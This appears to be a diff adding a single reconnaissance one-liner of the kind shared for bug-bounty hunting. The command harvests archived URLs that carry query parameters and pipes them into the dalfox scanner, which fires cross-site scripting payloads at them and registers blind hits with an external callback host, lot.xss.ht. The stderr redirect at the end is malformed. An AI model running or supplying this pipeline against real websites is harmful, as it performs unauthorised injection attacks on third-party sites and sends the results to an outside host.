@@ -1,0 +1,1 @@
+gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://lot.xss.ht -o result.txt >/dev/null 2&>1
